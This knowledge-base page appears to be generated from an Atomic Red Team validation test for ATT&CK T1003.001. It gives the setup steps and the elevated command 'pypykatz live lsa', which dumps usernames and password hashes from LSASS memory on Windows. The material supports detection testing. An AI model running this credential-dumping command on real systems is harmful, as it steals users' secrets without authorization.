---
atomic_guid: "c37bc535-5c62-4195-9cc3-0517673171d8"
title: "LSASS read with pypykatz"
framework: "atomic"
generated: "true"
attack_technique_id: "T1003.001"
attack_technique_name: "OS Credential Dumping: LSASS Memory"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.yaml"
build_date: "2026-04-27 19:12:25"
executor: "command_prompt"
aliases:
  - "c37bc535-5c62-4195-9cc3-0517673171d8"
  - "LSASS read with pypykatz"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Parses secrets hidden in the LSASS process with python. Similar to mimikatz's sekurlsa::

Python 3 must be installed, use the get_prereq_command's to meet the prerequisites for this test.

Successful execution of this test will display multiple usernames and passwords/hashes to the screen.

Will create a Python virtual environment within the External Payloads folder that can be deleted manually post test execution.

## ATT&CK Mapping

- [[kb/attack/techniques/T1003-os_credential_dumping#^t1003001-lsass-memory|T1003.001: LSASS Memory]]

## Input Arguments

### venv_path

- description: Path to the folder for the tactics venv
- type: string
- default: PathToAtomicsFolder\..\ExternalPayloads\venv_t1003_001

## Dependencies

Computer must have python 3 installed

### Prerequisite Check

```powershell
if (Get-Command py -errorAction SilentlyContinue) { exit 0 } else { exit 1 }
```

### Get Prerequisite

```powershell
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction ignore -Force | Out-Null
invoke-webrequest "https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe" -outfile "PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe"
Start-Process -FilePath "PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe" -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1 Include_test=0" -Wait
```

Computer must have venv configured at #{venv_path}

### Prerequisite Check

```powershell
if (Test-Path -Path "#{venv_path}") { exit 0 } else { exit 1 }
```

### Get Prerequisite

```powershell
py -m venv "#{venv_path}"
```

pypykatz must be installed

### Prerequisite Check

```powershell
if (Get-Command "#{venv_path}\Scripts\pypykatz" -errorAction SilentlyContinue) { exit 0 } else { exit 1 }
```

### Get Prerequisite

```powershell
& "#{venv_path}\Scripts\pip.exe" install --no-cache-dir pypykatz 2>&1 | Out-Null
```

## Executor

- elevation_required: True
- name: command_prompt

### Command

```cmd
"#{venv_path}\Scripts\pypykatz" live lsa
```

### Cleanup

```cmd
del "%temp%\nanodump.dmp" > nul 2> nul
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.yaml)
